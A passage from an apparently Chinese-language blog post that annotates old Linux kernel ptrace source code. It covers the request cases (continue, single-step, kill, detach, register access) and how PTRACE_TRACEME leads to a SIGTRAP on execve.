operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">||</span> addr <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>     addr <span class="token operator">&gt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">user</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>addr <span class="token operator">&lt;</span> FRAME_SIZE<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ret <span class="token operator">=</span> <span class="token function">putreg</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* We need to be very careful here.  We implicitly   want to modify a portion of the task_struct, and we   have to be selective about what portions we allow someone   to modify. */</span>  ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>     addr <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span>     <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> data<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> TASK_SIZE<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>addr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  data <span class="token operator">&amp;=</span> <span class="token operator">~</span>DR_CONTROL_RESERVED<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x5f54</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>data <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">goto</span> out_tsk<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  addr <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dummy<span class="token operator">-&gt;</span>u_debugreg<span class="token punctuation">;</span>  addr <span class="token operator">=</span> addr <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">;</span>  child<span class="token operator">-&gt;</span>thread<span class="token punctuation">.</span>debugreg<span class="token punctuation">[</span>addr<span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">;</span>  ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">/*都是让tracee继续运行，只是啥时候停止不同*/</span><span class="token keyword">case</span> PTRACE_SYSCALL<span class="token operator">:</span> <span class="token comment">/* continue and stop at next (return from) syscall */</span><span class="token keyword">case</span> PTRACE_CONT<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">/* restart after signal. */</span><span class="token keyword">long</span> tmp<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> data <span class="token operator">&gt;</span> _NSIG<span class="token punctuation">)</span><span class="token comment">//data为tracer传给tracee的信号数值，这里检查范围</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">==</span> PTRACE_SYSCALL<span class="token punctuation">)</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">|=</span> PT_TRACESYS<span class="token punctuation">;</span><span class="token comment">//设置PT_TRACESYS标志，为了在下一个系统调用处停止</span><span class="token keyword">else</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;=</span> <span class="token operator">~</span>PT_TRACESYS<span class="token punctuation">;</span><span class="token comment">//清除PT_TRACESYS标志，不停止</span>child<span class="token operator">-&gt;</span>exit_code <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token comment">/* make sure the single step bit is not set. 清除EFLAGS的单步标志(Trap Flag)*/</span>tmp <span class="token operator">=</span> <span class="token function">get_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>TRAP_FLAG<span class="token punctuation">;</span><span class="token function">put_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">,</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">wake_up_process</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//唤醒进程</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* * make the child exit.  Best I can do is send it a sigkill.  * perhaps it should be put in the status that it wants to  * exit. */</span><span class="token keyword">case</span> PTRACE_KILL<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token keyword">long</span> tmp<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>child<span class="token operator">-&gt;</span>state <span class="token operator">==</span> TASK_ZOMBIE<span class="token punctuation">)</span><span class="token comment">/* already dead */</span><span class="token keyword">break</span><span class="token punctuation">;</span>child<span class="token operator">-&gt;</span>exit_code <span class="token operator">=</span> SIGKILL<span class="token punctuation">;</span><span class="token comment">/* make sure the single step bit is not set. */</span>tmp <span class="token operator">=</span> <span class="token function">get_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>TRAP_FLAG<span class="token punctuation">;</span><span class="token function">put_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">wake_up_process</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/*设置单步运行很简单只需将eflags的Trap Flag置1即可*/</span><span class="token keyword">case</span> PTRACE_SINGLESTEP<span class="token operator">:</span> <span class="token punctuation">{</span>  <span class="token comment">/* set the trap flag. */</span><span class="token keyword">long</span> tmp<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> data <span class="token operator">&gt;</span> _NSIG<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;=</span> <span class="token operator">~</span>PT_TRACESYS<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;</span> PT_DTRACE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/* Spurious delayed TF traps may occur */</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">|=</span> PT_DTRACE<span class="token punctuation">;</span><span class="token punctuation">}</span>tmp <span class="token operator">=</span> <span class="token function">get_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">)</span> <span class="token operator">|</span> TRAP_FLAG<span class="token punctuation">;</span><span class="token comment">//Trap Flag置1</span><span class="token function">put_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>child<span class="token operator">-&gt;</span>exit_code <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token comment">/* give it a chance to run. */</span><span class="token function">wake_up_process</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">case</span> PTRACE_DETACH<span class="token operator">:</span><span class="token comment">/* detach a process that was attached. */</span>ret <span class="token operator">=</span> <span class="token function">ptrace_detach</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">/*读取所有通用寄存器值*/</span><span class="token keyword">case</span> PTRACE_GETREGS<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">/* Get all gp regs from the child. */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_WRITE<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span> FRAME_SIZE<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> FRAME_SIZE<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">__put_user</span><span class="token punctuation">(</span><span class="token function">getreg</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>data <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/*设置所有通用寄存器值*/</span><span class="token keyword">case</span> PTRACE_SETREGS<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">/* Set all gp regs in the child. */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> tmp<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_READ<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span> FRAME_SIZE<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> FRAME_SIZE<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">__get_user</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putreg</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> i<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>data <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/*获取浮点寄存器值*/</span><span class="token keyword">case</span> PTRACE_GETFPREGS<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">/* Get the child FPU state. */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_WRITE<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span>       <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">user_i387_struct</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>child<span class="token operator">-&gt;</span>used_math <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/* Simulate an empty FPU. */</span><span class="token function">set_fpu_cwd</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token number">0x037f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_fpu_swd</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token number">0x0000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_fpu_twd</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">get_fpregs</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">user_i387_struct</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span> child<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/*设置浮点寄存器值*/</span><span class="token keyword">case</span> PTRACE_SETFPREGS<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">/* Set the child FPU state. */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access_ok</span><span class="token punctuation">(</span>VERIFY_READ<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">,</span>       <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">user_i387_struct</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>child<span class="token operator">-&gt;</span>used_math <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">set_fpregs</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">user_i387_struct</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">case</span> PTRACE_GETFPXREGS<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">/* Get the child extended FPU state. */</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">case</span> PTRACE_SETFPXREGS<span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">/* Set the child extended FPU state. */</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">case</span> PTRACE_SETOPTIONS<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">&amp;</span> PTRACE_O_TRACESYSGOOD<span class="token punctuation">)</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">|=</span> PT_TRACESYSGOOD<span class="token punctuation">;</span><span class="token keyword">else</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;=</span> <span class="token operator">~</span>PT_TRACESYSGOOD<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">default</span><span class="token operator">:</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>out_tsk<span class="token operator">:</span><span class="token function">free_task_struct</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>out<span class="token operator">:</span><span class="token function">unlock_kernel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这个函数<code>get_stack_long(proccess, offset)</code>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* * this routine will get a word off of the processes privileged stack.  * the offset is how far from the base addr as stored in the TSS.   * this routine assumes that all the privileged stacks are in our * data space. */</span>   <span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">get_stack_long</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>task<span class="token punctuation">,</span> <span class="token keyword">int</span> offset<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>stack<span class="token punctuation">;</span>stack <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>task<span class="token operator">-&gt;</span>thread<span class="token punctuation">.</span>esp0<span class="token punctuation">;</span>stack <span class="token operator">+=</span> offset<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中task-&gt;thread.esp0是堆栈指针，通用的寄存器在堆栈中按顺序排放，通过偏移量0ffset便可以依次读取</p><h2 id="PTRACE-TRACEME"><a href="#PTRACE-TRACEME" class="headerlink" title="PTRACE_TRACEME"></a>PTRACE_TRACEME</h2><p>​    当要调试一个进程时需要其进入被追踪状态(traced)，有两种方法进入该状态：</p><ul><li>被调试进程<strong>主动</strong>调用<code>ptrace(PTRACE_TRACEME, ...)</code>进入traced状态</li><li>调试进程调用<code>ptrace(PTRACE_ATTACH, pid, ...)</code>来使指定进程进入</li></ul><p> 总之被调试进程必须进入traced状态才能进行调试，因为Linux会对处于traced状态的进程进行特殊操作。以第一种方式来说明：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">==</span> PTRACE_TRACEME<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/* are we already being traced? */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;</span> PT_PTRACED<span class="token punctuation">)</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token comment">/* set the ptrace bit in the process flags. */</span>current<span class="token operator">-&gt;</span>ptrace <span class="token operator">|=</span> PT_PTRACED<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">goto</span> out<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    只是将当前进程标记为<strong>PT_PTRACED</strong>状态，但是如果该进程接下来进行<strong>execve</strong>系统调用去执行一个外部程序时会<strong>暂停当前进程</strong>，并且发送<strong>SIGCHLD</strong>信号给<strong>父进程</strong>，父进程接收到该信号时就可以对被调试进程进行调试。</p><p><strong>sys_execve() -&gt; do_execve() -&gt; load_elf_binary()：</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">load_elf_binary</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">linux_binprm</span> <span class="token operator">*</span> bprm<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token operator">*</span> regs<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;</span> PT_PTRACED<span class="token punctuation">)</span>        <span class="token function">send_sig</span><span class="token punctuation">(</span>SIGTRAP<span class="token punctuation">,</span> current<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于处于traced状态的进程执行<strong>execve</strong>系统调用时会发送一个<strong>SIGTRAP给当前进程</strong>。这个信号将在<code>do_signal</code>函数处理：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">do_signal</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token operator">*</span>regs<span class="token punctuation">,</span> <span class="token class-name">sigset_t</span> <span class="token operator">*</span>oldset<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> signr<span class="token punctuation">;</span>        <span class="token function">spin_lock_irq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>current<span class="token operator">-&gt;</span>sigmask_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>        signr <span class="token operator">=</span> <span class="token function">dequeue_signal</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>current<span class="token operator">-&gt;</span>blocked<span class="token punctuation">,</span> <span class="token operator">&amp;</span>info<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">spin_unlock_irq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>current<span class="token operator">-&gt;</span>sigmask_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 如果进程被标记为 